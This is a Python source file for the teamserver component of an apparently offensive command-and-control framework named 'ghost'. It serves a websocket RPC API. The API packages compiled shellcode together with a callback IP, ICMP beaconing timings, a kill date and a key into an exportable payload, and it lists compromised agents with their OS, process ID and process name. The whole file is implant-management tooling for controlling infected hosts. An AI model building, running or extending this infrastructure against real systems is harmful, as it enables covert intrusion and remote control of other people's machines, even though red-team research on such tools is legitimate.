#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import os
import base64
import random
import struct
import asyncio
import uvicorn
import ipaddress

from lib import buffer

from fastapi import FastAPI
from fastapi_websocket_rpc import RpcMethodsBase
from fastapi_websocket_rpc import WebsocketRPCEndpoint

class RpcServerMethods( RpcMethodsBase ):
    """
    Exposed server methods to export payloads or queue commands to the
    agent.
    """
    def __init__( self, ghost ):
        # set the primary ghost object
        self.ghost = ghost

    async def teamserver_export_payload( self, 
                                         ip_address : str = '', 
                                         icmp_sleep : int = 0, 
                                         icmp_sleep_jitter : int = 0, 
                                         icmp_chunk_length : int = 0, 
                                         icmp_query_timeout : int = 0, 
                                         sleep : int = 0, 
                                         jitter : int = 0, 
                                         kill_date : int = 0,  
                                         is_arch64 : bool = False ) -> str:
        """
        Exports a configured payload to the callee with the specified options.
        """
        # Did you forget to compile the artifacts! Make sure you do this!
        if not os.path.exists( '../agent/ghost.x64.bin' ) or not os.path.exists( '../agent/ghost.x86.bin' ):

            # Print that we failed to compile the artifacts
            self.ghost.log.error( f'Cannot export a payload as the agent has not been compiled.' );

            # return nothing!
            return ''

        # extract the channel ID
        channel_id = await self.ghost.rpc.rpc_get_channel_id_by_object( self.channel );

        # Construct the struct configuration
        config  = struct.pack( '>I', int( ipaddress.ip_address( ip_address ) ) );
        config += struct.pack( '<I', icmp_sleep );
        config += struct.pack( '<B', icmp_sleep_jitter );
        config += struct.pack( '<I', icmp_query_timeout );
        config += struct.pack( '<H', icmp_chunk_length );
        config += struct.pack( '<I', sleep );
        config += struct.pack( '<B', jitter );
        config += struct.pack( '<Q', kill_date );
        config += struct.pack( '<I', len( self.ghost.key ) );
        config += self.ghost.key.encode()

        # Open the request shellcode based on the architecture
        with open( '../agent/ghost.x64.bin' if is_arch64 else '../agent/ghost.x86.bin', 'rb+' ) as file:
            # Return the encoded shellcode as a base64 block safely
            return base64.b64encode( file.read() + config ).decode()

    async def teamserver_agent_list_get( self ) -> list:
        """
        Returns all agents within the database and their information
        """
        inf_lst_result = []
        inf_sql_result = await self.ghost.dbs.database_agent_get_list();

        # Loop through each entry and return a list of dictionary objects
        for inf_result in inf_sql_result:
            # Append to the list in the order they were recieved!
            inf_lst_result.append( { 'id': inf_result.agent_id,
                                     'os_major': inf_result.os_major,
                                     'os_minor': inf_result.os_minor,
                                     'os_build': inf_result.os_build,
                                     'pid': inf_result.pid,
                                     'ppid': inf_result.ppid,
                                     'process': inf_result.process } );

        # Return the list
        return inf_lst_result

    async def teamserver_event_log_get( self, log_offset : int = 0 ) -> list:
        """
        Reads from the event log and returns the list of events at and past the
        specified offset.
        """
        log_evt_result = []
        log_sql_result = await self.ghost.dbs.database_event_get_queue( log_offset );

        # Loop through each entry and return a dictionary object
        for log_result in log_sql_result:
            # Append to the list in the order they were recieved!
            log_evt_result.append( { 'timestamp': log_result.ev_time, 'type': log_result.ev_type, 'message': log_result.message } );

        # Return the list, empty or not!
        return log_evt_result

class RpcServer:
    """
    A class representing the fastapi RPC server. Exposes methods on to interact
    with the agent or retrieve information from the server about the agents or
    collected data.
    """
    def __init__( self, ghost ):
        # set the primary ghost object
        self.ghost = ghost

        # Lock for accessing the channel list
        self.channel_list_lock = asyncio.Lock();

        # List of the connected channels and their ID
        self.channel_list = []

        # fastapi application
        self.fastapi_application = FastAPI()

        # Create the web socket endpoint
        self.fastapi_application_websock = WebsocketRPCEndpoint( RpcServerMethods( self.ghost ), on_connect = [ self._on_channel_enter ], on_disconnect = [ self._on_channel_leave ] );
        self.fastapi_application_websock.register_route( self.fastapi_application );

    async def start( self, teamserver_host, teamserver_port ):
        """
        Starts the fastapi server on the specified host:port
        """
        # create the server configuration
        server = uvicorn.Server( 
            uvicorn.Config( self.fastapi_application, host = teamserver_host, port = teamserver_port, log_level = 'critical' ),
        );

        # create the 'task' we return to await on
        return asyncio.create_task( server.serve() );

    async def _on_channel_enter( self, channel ):
        """
        Adds a channel to the list of valid channels when an RPC session is 
        successfully negotiated.
        """
        # Acquire an exclusive lock to the list
        async with self.channel_list_lock:
            # Generate a unique channel ID
            channel_uniq_id = random.getrandbits( 32 );

            # Add to the list of valid channels
            self.channel_list.append( { 'id': channel_uniq_id, 'object': channel } );

    async def _on_channel_leave( self, channel ):
        """
        Removes a channel from the list of valid channels when an RPC session
        is lost.
        """
        # Acquire an exclusive lock to the list
        async with self.channel_list_lock:
            # Loop through each entry in the list
            for channel_entry in self.channel_list:
                # Is this the channel we are looking for?
                if channel_entry[ 'object' ] == channel:
                    # Delete it from the list!
                    del self.channel_list[ self.channel_list.index( channel_entry ) ]

    async def rpc_get_channel_object_by_id( self, channel_id ):
        """
        Returns the channel object based on its channel ID if it exists and is
        still connected.
        """
        # Acquire an exclusive lock to the list
        async with self.channel_list_lock:
            # Loop through each object in the list
            for channel_entry in self.channel_list:
                # Is this the channel we are looking for?
                if channel_entry[ 'id' ] == channel_id:
                    # return the channel object
                    return channel_entry[ 'object' ]

        # Channel no longer exists return nothing.
        return None

    async def rpc_get_channel_id_by_object( self, channel_object ):
        """
        Returns the channel ID based on on the object it exists and is still
        connected.
        """
        # Acquire an exclusive lock to the list
        async with self.channel_list_lock:
            # Loop through each object in the list
            for channel_entry in self.channel_list:
                # Is this the channel we are looking for?
                if channel_entry[ 'object' ] == channel_object:
                    # return the channel ID
                    return channel_entry[ 'id' ]

        # Channel no longer exists return nothing!
        return None
